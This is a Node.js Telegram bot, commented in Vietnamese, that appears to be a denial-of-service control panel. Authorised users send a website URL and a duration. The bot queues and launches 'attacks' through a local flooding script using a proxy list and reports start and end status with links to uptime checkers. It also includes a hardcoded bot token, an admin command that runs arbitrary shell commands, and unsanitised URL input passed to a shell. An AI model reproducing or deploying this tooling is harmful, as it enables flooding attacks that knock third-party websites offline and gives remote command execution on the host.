const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);

const bot = new TelegramBot(token, { polling: true });

const maxSlot = 1; // Số lượng tiến trình đồng thời mỗi người dùng có thể chạy
const maxCurrent = 3; // Số lượng tiến trình đồng thời toàn bộ hệ thống có thể chạy

let currentProcesses = 0;
let queue = [];
let userProcesses = {};

bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');

bot.on('message', async (msg) => {
    const chatId = msg.chat.id, text = msg.text, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId);
    const username = msg.from.username || msg.from.first_name;
    const userId = msg.from.id;

    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền thực hiện lệnh này.', { parse_mode: 'HTML' });

    if (text.startsWith('http://') || text.startsWith('https://')) {
        const [host, time] = text.split(' ');
        if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <URL> <time>.', { parse_mode: 'HTML' });

        const pid = Math.floor(Math.random() * 10000);
        const startMessage = {
            Status: "🚀Successfully🚀",
            Caller: username,
            "PID Attack": pid,
            Website: host,
            Time: `${time} Giây`,
            Maxslot: maxSlot,
            ConcurrentAttacks: currentProcesses,
            StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
            CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
            HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
        };

        if (currentProcesses >= maxCurrent || (userProcesses[userId] && userProcesses[userId] >= maxSlot)) {
            queue.push({ userId, host, time, pid, chatId, username });
            return bot.sendMessage(chatId, `⏳ Yêu cầu của bạn đã được đưa vào hàng đợi. Vui lòng chờ...`, { parse_mode: 'HTML' });
        }

        userProcesses[userId] = (userProcesses[userId] || 0) + 1;
        currentProcesses++;

        await bot.sendMessage(chatId, JSON.stringify(startMessage, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: [
            [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
        ]}});

        const child = exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
        child.on('close', () => {
            const completeMessage = { Status: "✅Process completed✅", Caller: username, "PID Attack": pid, Website: host, Time: `${time} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
            bot.sendMessage(chatId, JSON.stringify(completeMessage, null, 2), { parse_mode: 'HTML' });

            userProcesses[userId]--;
            currentProcesses--;

            if (queue.length > 0) {
                const next = queue.shift();
                bot.sendMessage(next.chatId, `🚀 Bắt đầu tiến trình từ hàng đợi: ${next.host} ${next.time} Giây`, { parse_mode: 'HTML' });
                bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.username }, text: `${next.host} ${next.time}` });
            }
        });
        return;
    }

    if (text.startsWith('exe ') && isAdmin) {
        const command = text.slice(4).trim();
        if (!command) return bot.sendMessage(chatId, '🚫 Lệnh không được để trống. Ví dụ: exe ls', { parse_mode: 'HTML' });
        exec(command, { shell: '/bin/bash' }, (error, stdout, stderr) => {
            bot.sendMessage(chatId, `🚀 Command result:\n<pre>${command}\n${stdout || stderr}</pre>`, { parse_mode: 'HTML' });
        });
        return;
    }

    bot.sendMessage(chatId, '🚫 Lệnh không hợp lệ. Vui lòng bắt đầu lệnh với "exe" hoặc nhập URL và thời gian.', { parse_mode: 'HTML' });
});
